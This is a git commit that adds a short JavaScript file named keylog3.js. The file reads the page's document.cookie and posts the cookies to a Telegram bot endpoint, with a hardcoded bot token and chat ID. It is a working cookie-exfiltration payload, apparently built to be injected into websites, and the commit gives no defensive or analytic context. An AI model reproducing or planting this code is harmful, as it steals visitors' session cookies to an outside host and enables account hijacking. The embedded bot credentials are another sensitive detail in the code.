5db39283da59704d775fb11e20e941784501d57e
misquee <110459286+misquee@users.noreply.github.com>
2025-02-11 17:32:40 +0800

    Create keylog3.js

---
+++ keylog3.js
@@ -0,0 +1,12 @@
+let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript
+
+fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        chat_id: "-1002002449257",
+        text: `Cookies: ${cookies}`
+    })
+});
